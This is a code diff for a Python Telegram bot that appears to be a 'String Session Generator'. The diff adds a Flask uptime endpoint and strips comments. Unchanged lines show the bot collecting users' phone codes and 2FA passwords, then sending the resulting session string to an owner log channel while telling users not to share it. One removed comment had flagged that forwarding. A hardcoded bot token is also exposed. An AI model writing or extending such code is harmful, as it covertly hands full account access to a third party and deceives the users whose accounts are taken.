@@ -1,3 +1,4 @@
+import os
 import telebot
 from telebot import types
 import asyncio
@@ -6,6 +7,8 @@ from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 from pyrogram import Client
 from pyrogram.errors import BadRequest, SessionPasswordNeeded
+from flask import Flask
+import threading
 
 # === CONFIG ===
 API_TOKEN = "8328091240:AAFuCooUWJsIdZxhtc5PYiP36_q4gUzL1ec"
@@ -18,6 +21,13 @@ CHANNELS = [
 
 bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")
 user_sessions = {}  # store user temporary data
+
+# Flask app (for uptime ping)
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "✅ Bot is running!"
 
 
 # ========== JOIN CHECK ==========
@@ -119,7 +129,6 @@ def get_phone(message):
     
     bot.send_message(message.chat.id, "📩 Please wait... sending code to your phone.")
     
-    # Run the appropriate login flow based on the selected library
     if user_sessions[user_id]["lib"] == "telethon":
         asyncio.run(telethon_login(user_id))
     else:
@@ -158,8 +167,6 @@ async def complete_telethon_login(user_id, code):
     try:
         await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
         string_session = StringSession.save(client.session)
-        
-        # Clean up and send the string
         await client.disconnect()
         send_string(user_id, data, string_session)
     except SessionPasswordNeededError:
@@ -179,12 +186,9 @@ def get_telethon_password(message):
 async def complete_telethon_with_password(user_id, password):
     data = user_sessions[user_id]
     client = data["client"]
-    
     try:
         await client.sign_in(password=password)
         string_session = StringSession.save(client.session)
-        
-        # Clean up and send the string
         await client.disconnect()
         send_string(user_id, data, string_session)
     except Exception as e:
@@ -220,12 +224,9 @@ def get_pyrogram_otp(message):
 async def complete_pyrogram_login(user_id, code):
     data = user_sessions[user_id]
     client = data["client"]
-    
     try:
         await client.sign_in(phone_number=data["phone"], phone_code=code, phone_code_hash=data["phone_code_hash"])
         string_session = await client.export_session_string()
-        
-        # Clean up and send the string
         await client.disconnect()
         send_string(user_id, data, string_session)
     except SessionPasswordNeeded:
@@ -245,12 +246,9 @@ def get_pyrogram_password(message):
 async def complete_pyrogram_with_password(user_id, password):
     data = user_sessions[user_id]
     client = data["client"]
-    
     try:
         await client.check_password(password=password)
         string_session = await client.export_session_string()
-        
-        # Clean up and send the string
         await client.disconnect()
         send_string(user_id, data, string_session)
     except Exception as e:
@@ -264,8 +262,6 @@ def send_string(chat_id, data, string):
     username = bot.get_chat(chat_id).username or "NoUsername"
     
     bot.send_message(chat_id, f"✅ Your <b>{lib}</b> String Session:\n\n<code>{string}</code>\n\n📌 Save this safely and don't share it with anyone!")
-    
-    # Send to owner log channel
     try:
         bot.send_message(
             OWNER_LOG_CHANNEL,
@@ -278,4 +274,9 @@ def send_string(chat_id, data, string):
 # === RUN BOT ===
 if __name__ == "__main__":
     print("🚀 Session String Generator Bot Started...")
-    bot.infinity_polling()
+
+    def run_bot():
+        bot.infinity_polling()
+
+    threading.Thread(target=run_bot).start()
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
